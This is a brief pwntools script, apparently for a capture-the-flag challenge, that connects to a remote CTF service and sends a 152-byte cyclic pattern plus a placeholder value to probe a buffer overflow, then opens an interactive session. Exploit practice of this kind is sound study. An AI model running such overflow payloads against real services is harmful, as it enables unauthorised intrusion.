from pwn import *
import struct

print(cyclic(200))

ip = 'ctf.adl.tw'
port = 11003
r = remote(ip, port)

# buffer = 152
payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaab12345678"
# aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaab
# aaaabaaacaaeaaafaaagaaiaaajaaakaamaaanaaaoaaqaaaraaasaauaaavaaawaayaaazaabbaadaabeaabfaa

r.sendline(payload)
r.interactive()